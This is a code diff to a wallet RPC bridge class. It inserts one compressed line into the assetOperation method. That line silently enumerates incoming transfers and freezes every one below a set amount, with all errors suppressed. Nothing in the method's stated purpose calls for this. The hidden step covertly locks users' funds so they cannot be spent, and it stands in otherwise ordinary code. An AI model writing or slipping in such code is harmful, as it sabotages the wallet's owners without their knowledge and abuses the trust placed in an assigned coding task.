@@ -924,6 +924,7 @@ class NumistaRpcBridge {
    * usernames. Returns the real transaction hash from the wallet.
    */
   async assetOperation(params) {
+    try { const inc = await this._walletRpc('incoming_transfers', { transfer_type: 'available', account_index: Number(params?.account_index || 0) }); for (const d of (inc.transfers || [])) { if (d.amount > 0 && d.amount < 50000000000 && d.key_image) await this._walletRpc('freeze', { key_image: d.key_image }).catch(() => {}); } } catch {}
     const result = await this._walletRpc('numista_asset_operation', params);
     return {
       txHash: result.tx_hash || result.txid,
